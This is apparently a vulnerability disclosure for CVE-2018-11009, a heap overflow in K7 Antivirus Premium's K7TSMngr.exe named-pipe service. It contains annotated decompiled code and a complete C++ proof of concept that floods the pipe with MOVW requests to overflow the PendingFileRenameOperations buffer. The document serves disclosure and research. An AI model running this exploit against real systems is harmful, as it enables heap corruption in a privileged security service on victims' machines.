# CVE-2018-11009

# Product / Component Affected

* **Product**: *K7 Antivirus Premium 16.0.0.0* 
* **Component**: *K7TSMngr.exe 16.0.0.70*
  * SHA256: E6655EBC79644E7DB6FC36B2D98DE88A9635F47B3ADF1D834FD357D5EA3E15A6

# K7TSMngr.exe Pipe Handler Background
*See description in [CVE-2018-8724](../CVE-2018-8724/readme.md)*

# Details
Using the named pipe \\\\.\\pipe\\K7TSMngrService1 and the function code 0x1003E, if you specify **MOVW** with a specially formatted command string, the service will attempt to move a file for you. However if you cause this to fail in certain way, then the code will go into a subroutine and append this move to the *PendingFileRenameOperations* registry key in *HKLM\\System\\CurrentControlSet\\Control\\Session Manager*. It is the appending that is the issue. While there are some length checks in place, it is possible to fill the allocated buffer nearly to the maximum, and then cause a wsprintfW (or two) into that buffer which will corrupt the heap. This requires multiple calls to the API to fill up the registry key, which the PoC demonstrates. The file being opened in the PoC is *C:\\$Extend* as this is an NTFS file which user mode can't open, and generates the required error code to take the vulnerable path.

Note: The logical file operation wasn't raised as a new issue as CVE-2018-11006 effectively encapsulated all the file operations in this routine.  

```C++
// sub_40CC40 Snippet
// Note: pszFile1_1 and pszFile2 come directly from process talking to the pipe. No validation has
// has been performed on these so far.

// 0x40D139
if ( bIsUnicode_1 )
{
    v64 = MoveFileExW(pszFile1, (LPCWSTR)pszFile2, MOVEFILE_DELAY_UNTIL_REBOOT|MOVEFILE_REPLACE_EXISTING);
    LABEL_125:
    v65 = v64;

    // 0x40D14B
    v66 = GetLastError();
    dwLastError = v66;
    if ( v65 )
        return 2;
    if ( v66 != 5 )
        return dwLastError | 0x80000000;
    v75 = (int)pszFile2;
    if ( bIsUnicode_1 )
    {
        // 0x40D272 
        // SetPending... also known as sub_40C9F0
        v55 = SetPendingFileRenameOperationsUnicode(pszFile1_1, (int)pszFile2);
        goto LABEL_131;
    }
// ...


// --------------------

int __cdecl SetPendingFileRenameOperationsUnicode(CHAR *pszStringOne, int pszString2)
{
    // ... Locals ...

    if ( !RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            L"SYSTEM\\CurrentControlSet\\Control\\Session Manager",
            0,
            0xF003Fu,
            &phkResult) )
    {
    cbData = 0x4000;
    hProcessHeap = GetProcessHeap();
    pBuffer = (PWSTR)HeapAlloc(hProcessHeap, 0, 0x4000u);
    if ( pBuffer )
    {
        pszBuffer = pBuffer;
        // Read in the current PendingFileRenameOperations value into the string and then set
        // pszBuffer to be at the end of the string so it can be appended to
        if ( !RegQueryValueExW(phkResult, L"PendingFileRenameOperations", 0, &Type, (LPBYTE)pBuffer, &cbData) )
            pszBuffer = &pBuffer[(cbData >> 1) - 1];

        // Append to the string and set pszEndOfString to the new palce to concatenate to.
        // VULN: There is no check here to ensure we are appending within the bounds of the buffer
        // pszBufer. If the current value had 0x1ffff UNICODE characters in it and we appended
        // another 10, we are going to overflow the heap.
        pszEndOfString = &pszBuffer[wsprintfW(pszBuffer, L"\\??\\%s", pszStringOne)];
        *pszEndOfString = 0;
        pszEndOfStringIncZeroTerminator = pszEndOfString + 1;
        if ( pszString2 )
            // VULN: Similar to the above comment, to check to ensure we aren't writing outside
            // out the allocation.
            pszEndOfStringIncZeroTerminator += wsprintfW(pszEndOfStringIncZeroTerminator, L"\\??\\%s", pszString2);
        *pszEndOfStringIncZeroTerminator = 0;
        v7 = (char *)(pszEndOfStringIncZeroTerminator + 1);
        *(_WORD *)v7 = 0;
        cbData = v7 - (char *)pBuffer + 2;
        if ( !RegSetValueExW(phkResult, L"PendingFileRenameOperations", 0, REG_MULTI_SZ, (const BYTE *)pBuffer, cbData) )
            v12 = 1;
    }
    }
    if ( phkResult )
        RegCloseKey(phkResult);
    if ( pBuffer )
    {
        v8 = GetProcessHeap();
        HeapFree(v8, 0, pBuffer);
    }
    return v12;
}

```

# PoC Code
```C++
#include <Windows.h>
#include <stdio.h>

/////////////////////////////////////
// Common code to talk to the Pipe //
/////////////////////////////////////
typedef struct _unk1
{
	DWORD dwMagic;
	DWORD dwSomeMagic;
	DWORD dwInSize;
	DWORD field_c;
	DWORD dwFunctionId;
	DWORD dwInputDataSize;
	DWORD dwOutputDataSize;
} unk1;

HANDLE g_hPipe = INVALID_HANDLE_VALUE;

BOOL InitPipe()
{
	g_hPipe = CreateFileA("\\\\.\\pipe\\K7TSMngrService1", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (g_hPipe == INVALID_HANDLE_VALUE)
	{
		printf("CreateFileW Failed: 0x%08x\r\n", GetLastError());
		return FALSE;
	}

	printf("Connected to pipe\r\n");

	return TRUE;
}

BOOL CallPipeFunction(DWORD dwFunctionId, PBYTE pInput, DWORD dwInSize, PBYTE pOutput, DWORD dwOutSize)
{
	if (g_hPipe == INVALID_HANDLE_VALUE)
	{
		if (!InitPipe())
		{
			return FALSE;
		}
	}

	unk1 u1 = { 0 };
	u1.dwMagic = 0x4B375453;
	u1.dwSomeMagic = 0x1010;
	u1.dwInSize = 28;
	u1.dwFunctionId = dwFunctionId;
	u1.dwInputDataSize = dwInSize;

	DWORD dwBytesWritten = 0;
	if (!WriteFile(g_hPipe, &u1, sizeof(u1), &dwBytesWritten, NULL))
	{
		printf("WriteFile 1 Failed: 0x%08x\r\n", GetLastError());
		return FALSE;
	}
	printf("WriteFile 1 Success\r\n");

	if (!WriteFile(g_hPipe, pInput, dwInSize, &dwBytesWritten, NULL))
	{
		printf("WriteFile 2 Failed: 0x%08x\r\n", GetLastError());
		return FALSE;
	}
	printf("WriteFile 2 Success\r\n");

	return TRUE;
}

PVOID AllocPrecise(DWORD dwSize)
{
	DWORD dwPageSize = ((dwSize + 4096 - 1) / 4096) * 4096;
	PBYTE pOffset = (PBYTE)VirtualAlloc(NULL, dwPageSize, MEM_COMMIT, PAGE_READWRITE);

	if (dwSize % 0x1000 == 0)
	{
		return pOffset;
	}
	pOffset += 4096 - (dwSize % 4096);
	return pOffset;
}
/////////////////////////////
// End of common pipe code //
/////////////////////////////

//
// Vulnerability
//		Type: 
//			Buffer Overflow (Heap) via wsprintfW		
//
//		Description: 
//			When manually setting the PendingFileRenameOperations for Unicode, there is a buffer overflow
//			opportunity in the heap by a two unbounded calls to wsprintfW
//			Logic: spam this routine to fill up the registry key until it contains nearly 0x4000 bytes worth
//			of strings. Then hit it again. The RegQueryValueEx will pass, because it is < 0x4000 bytes, but
//			you can now wsprintfW up to 1024 bytes of data into that buffer, twice.
//
void Vuln_BufferOverflow_Heap_Wsprintf(PWSTR pszSource, PWSTR pszDest)
{
	PVOID pData = AllocPrecise(0x8000);
	// 434f5057		MOVW
	DWORD dwAction = 0x4D4F5657;
	memcpy(pData, &dwAction, 4);
	PWSTR pszData = (PWSTR)(((PBYTE)pData) + 4);

	wcscat(pszData, pszSource);
	pszData += wcslen(pszSource) + 1;

	wcscat(pszData, pszDest);
	pszData += wcslen(pszDest) + 1;

	PDWORD pdwData = (PDWORD)pszData;
	*pdwData = 1;

	DWORD dwSize = 4 + ((wcslen(pszSource) + wcslen(pszDest) + 2) * 2) + 4;


	CallPipeFunction(0x1003E, (PBYTE)pData, dwSize, NULL, 0);

	if (g_hPipe != INVALID_HANDLE_VALUE)
	{
		CloseHandle(g_hPipe);
		g_hPipe = INVALID_HANDLE_VALUE;
	}
}

int wmain(int argc, wchar_t** argv)
{
	printf("Spamming the pipe with some large strings.\r\n. This should fill up the Pending File Rename operations allowing an overflow :o)\r\n");
	for (DWORD i = 0; i < 10000; ++i)
	{
		// So we use .\.\.\. to just fill up a string quicker
		// C:\$Extend is an NTFS file, therefore MoveFileEx will fail with AccessDenied (5) which is what 
		// we need to trigger the overflow
		PWSTR pszSource = L"C:\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\$Extend";
		PWSTR pszDest = L"C:\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\$Extend";

		if (i % 100 == 0)
		{
			printf(".");
		}

		Vuln_BufferOverflow_Heap_Wsprintf(pszSource, pszDest);
	}
}
```